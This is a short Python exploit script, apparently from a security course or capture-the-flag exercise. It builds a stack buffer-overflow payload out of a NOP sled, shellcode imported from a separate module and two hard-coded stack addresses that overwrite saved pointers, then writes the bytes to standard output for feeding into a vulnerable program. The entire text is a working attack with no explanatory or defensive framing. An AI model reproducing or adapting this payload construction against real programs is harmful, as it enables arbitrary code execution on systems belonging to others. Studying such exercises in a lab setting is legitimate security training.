from shellcode import shellcode
import sys

buffer = b"\x90" * (2048 - len (shellcode)) + shellcode
a = b"\xe8\xce\xf6\xff"
p = b"\xfc\xd5\xf6\xff"
payload = buffer + a + p

sys.stdout.buffer.write(payload)
